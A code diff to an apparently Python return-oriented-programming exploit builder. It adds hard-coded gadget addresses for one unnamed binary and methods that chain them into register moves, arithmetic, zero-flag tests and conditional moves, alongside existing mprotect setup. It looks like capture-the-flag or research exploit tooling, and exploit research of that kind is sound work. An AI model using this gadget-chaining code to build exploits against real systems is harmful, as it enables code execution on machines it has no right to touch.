@@ -17,10 +17,18 @@ exit_addr       = 0x0000000000434180
 nop_gadet       = 0x0000000000408B87
 cmov_rax_rdx    = 0x000000000048D057
 xchg_eax_esp    = 0x000000000040037f
-add_eax_edi_g     = 0x000000000041C673
+add_eax_edi_g   = 0x000000000041C673
 mov_eax_esp     = 0x00000000004236DB
 xchg_eax_ebx    = 0x0000000000459339
 pop_rbx         = 0x000000000040B7CE
+xchg_eax_edi    = 0x00000000004aca10
+dec_rax_g       = 0x000000000433613
+inc_rax_g       = 0x0000000000463b90
+imul_esi_edx    = 0x00000000046491E
+pop_rcx         = 0x00000000004b8f17
+mov_edx_eax     = 0x000000000473C32 # edx, eax ; sub edx, ecx ; mov eax, edx ; ret
+pop_rdx         = 0x0000000004560B4
+add_eax_esi     = 0x0000000000464921
 
 class metaGadetGenerator:
     def __init__(self, exp : exploiterTemplate) -> None:
@@ -50,6 +58,19 @@ class metaGadetGenerator:
         self.rdx_equ(prot)
 
         self.exp.add_gadet(mprotect_addr)
+
+    def dec_rax(self):
+        self.exp.add_gadet(dec_rax_g)
+
+    def inc_rax(self):
+        self.exp.add_gadet(inc_rax_g)
+
+    def esi_equ_edx(self):
+        self.rsi_equ(1)
+        self.exp.add_gadet(imul_esi_edx)
+
+    def signed_multiply_esi_edx(self):
+        self.exp.add_gadet(imul_esi_edx)
 
     def rbp_equ(self, val):
         self.exp.add_gadet(pop_rbp) # pop rbp ; ret
@@ -131,6 +152,28 @@ class metaGadetGenerator:
         self.exp.add_gadet(0x0000000000437A85)
         self.exp.add_gadet(val)
 
+    def test_value(self, addr):
+        # Read variable value from addr
+        self.rax_equ(addr)
+        self.exp.add_gadet(derefer_rax_rax)
+        
+        # set ZF acordingly if *addr == 0
+        self.add_rax_2()
+        self.sub_rax_1()
+        self.sub_rax_1()
+
+    def test_rax_rax(self):
+        # set ZF acordingly if RAX == 0
+        self.add_rax_2()
+        self.sub_rax_1()
+        self.sub_rax_1()
+
+    def cond_mov_rax_rdx(self):
+        self.exp.add_gadet(cmov_rax_rdx)
+        
+    def add_eax_esi(self):
+        self.exp.add_gadet(add_eax_esi)
+
     def rax_equ(self, val):
         self.exp.add_gadet(0x000000000044db34) # pop rax ; ret
         self.exp.add_gadet(val)
@@ -140,6 +183,15 @@ class metaGadetGenerator:
         self.exp.add_gadet(0x0000000000401c87) # pop rsi ; ret
         self.exp.add_gadet(val)
 
+    def rcx_equ(self, val):
+        self.exp.add_gadet(pop_rcx)
+        self.exp.add_gadet(val)
+
+    # Side-Effects:
+    #   Zeros ECX
+    def edx_equ_eax(self):
+        self.rcx_equ(0)
+        self.exp.add_gadet(mov_edx_eax)
 
     def qword_convert(self, ea_start, position):
         return ea_start + position * 8
@@ -160,6 +212,9 @@ class metaGadetGenerator:
 
     def add_eax_to_ebx(self):
         self.exp.add_gadet(0x0000000000474f21) # add ebx, eax ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
+
+    def exchange_eax_edi(self):
+        self.exp.add_gadet(xchg_eax_edi)
 
     def exchange_eax_ebx(self):
         self.exp.add_gadet(0x0000000000459339) # xchg eax, ebx ; ret
@@ -185,6 +240,8 @@ class metaGadetGenerator:
 
 
     # 32 Bit
+    # Side effects:
+    #   Zeros R12
     def eax_equ_esp(self):
         self.exp.add_gadet(mov_eax_esp)
 
